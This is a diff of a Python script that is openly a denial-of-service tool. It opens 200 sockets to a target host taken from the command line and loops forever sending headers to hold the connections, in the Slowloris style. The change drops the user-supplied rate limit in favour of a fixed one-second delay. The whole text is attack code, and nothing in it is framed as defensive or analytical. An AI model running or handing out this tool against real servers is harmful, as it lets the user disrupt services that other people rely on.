@@ -21,13 +21,14 @@ def setupSocket(ip):
     return sock
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("usage: python3 {} example.com ratelimit".format(sys.argv[0]))
+    if len(sys.argv) != 2:
+        print("usage: python3 {} example.com".format(sys.argv[0]))
         sys.exit()
 
     ip = sys.argv[1]
     count = 200
     print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
+    print("wait until reach socket {}".format(count))
 
     for i in range(count):
         try:
@@ -40,7 +41,6 @@ if __name__ == "__main__":
         sockets.append(sock)
 
     send = 0
-    limit = sys.argv[2]
 
     while True:
         print("Connected to {} sockets. Sending headers...".format(send))
@@ -52,4 +52,4 @@ if __name__ == "__main__":
             except socket.error:
                 sockets.remove(sock)
                 
-        time.sleep(limit)
+        time.sleep(1)
